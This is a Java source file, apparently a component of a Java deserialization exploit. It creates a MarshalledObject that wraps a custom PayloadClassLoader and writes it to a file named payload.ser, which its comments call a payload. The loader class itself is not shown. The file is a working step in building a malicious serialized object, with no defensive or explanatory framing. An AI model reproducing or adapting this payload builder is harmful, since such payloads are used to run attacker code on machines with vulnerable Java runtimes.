import java.io.FileOutputStream;
import java.io.IOException;
import java.io.ObjectOutputStream;
import java.rmi.MarshalledObject;

/**
 * This class is a helper class for creating the serialized MarshalledObject,
 * containing also a serialized PayloadClassloader. Path to the payload.ser file
 * needs to be adjusted.
 * 
 * @author mka
 * 
 */
public class PayloadCreater {

	public static void main(String[] args) {

		PayloadCreater creater = new PayloadCreater();
		try {
			creater.getPayload();
		} catch (IOException e) {

			e.printStackTrace();
		}
	}

	private void getPayload() throws IOException {
		
		PayloadClassLoader loader = new PayloadClassLoader();
		MarshalledObject<PayloadClassLoader> object = new MarshalledObject<PayloadClassLoader>(
				loader);

		FileOutputStream stream = new FileOutputStream("./src/payload.ser");
		ObjectOutputStream ostream = new ObjectOutputStream(stream);
		ostream.writeObject(object);
		stream.close();
	}

}
